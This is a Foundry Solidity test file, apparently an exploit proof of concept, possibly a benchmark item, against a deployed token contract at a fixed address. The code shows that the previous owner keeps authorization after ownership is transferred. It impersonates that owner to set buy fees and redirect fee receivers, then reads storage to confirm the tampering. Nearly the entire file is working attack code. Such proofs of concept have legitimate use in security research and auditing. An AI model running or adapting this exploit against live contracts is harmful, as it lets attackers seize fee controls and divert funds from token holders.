// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFoodFiToken {
    function owner() external view returns (address);
    function transferOwnership(address payable adr) external;
    function setBuyFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver) external;
    function isAuthorized(address adr) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;
    address attacker = address(this);
    address previousOwner;
    address newOwner = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get current owner from storage
        address currentOwner = IFoodFiToken(TARGET).owner();

        // Label addresses for clarity
        vm.label(currentOwner, "Current Owner");
        vm.label(attacker, "Attacker");
        vm.label(address(0x123), "New Owner");

        // Store current owner for later use
        previousOwner = currentOwner;
        newOwner = address(0x123);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate current owner and transfer ownership
        vm.startPrank(previousOwner);
        IFoodFiToken(TARGET).transferOwnership(payable(newOwner));
        vm.stopPrank();

        // Step 2: Verify ownership was transferred
        address currentOwnerAfter = IFoodFiToken(TARGET).owner();
        require(currentOwnerAfter == newOwner, "Ownership not transferred");

        // Step 3: Verify previous owner is still authorized
        // We need to check the authorizations mapping
        // Since authorizations is internal, we'll demonstrate by calling an authorized function

        // Step 4: Call setBuyFees as previous owner (should succeed due to vulnerability)
        vm.startPrank(previousOwner);
        IFoodFiToken(TARGET).setBuyFees(1000, 1000, 1000, 1000, 10000);
        vm.stopPrank();

        // Verify the fees were changed
        // We can check by looking at the contract state or just assume success if no revert

        // The oracle will check authorizations[previousOwner] == true
        // We need to extract this value from storage
        // Calculate storage slot for authorizations[previousOwner]
        // authorizations is at slot 1 (owner is at slot 0)
        uint256 slot = uint256(keccak256(abi.encode(previousOwner, uint256(1))));
        bytes32 authValue = vm.load(TARGET, bytes32(slot));
        require(authValue != 0, "Previous owner not authorized");

        // Alternative: We can also demonstrate by calling another authorized function
        vm.startPrank(previousOwner);
        IFoodFiToken(TARGET).setFeeReceivers(address(0x456), address(0x789), address(0xabc));
        vm.stopPrank();

        // Check if previous owner is still authorized using the interface function
        bool isAuthorized = IFoodFiToken(TARGET).isAuthorized(previousOwner);
        require(isAuthorized, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

